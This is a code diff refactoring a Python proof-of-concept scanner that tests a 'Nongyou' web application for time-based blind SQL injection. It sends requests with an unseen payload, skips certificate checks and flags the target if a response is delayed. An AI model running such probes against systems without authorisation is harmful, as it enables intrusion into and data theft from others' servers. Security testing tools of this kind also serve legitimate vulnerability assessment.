@@ -11,14 +11,7 @@ import sys
 import time
 import requests
 import warnings
-
-
-
-class nongyou_sleep_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['农友多处时间盲注','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -32,7 +25,7 @@ class nongyou_sleep_sqli:
         try:
             noexist = True
             for turl in urls:
-                vulnurl = self.url + turl + payload
+                vulnurl = url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if time.time() - start_time >= 6:
                     result[2]=  '存在'
@@ -47,5 +40,5 @@ class nongyou_sleep_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = nongyou_sleep_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
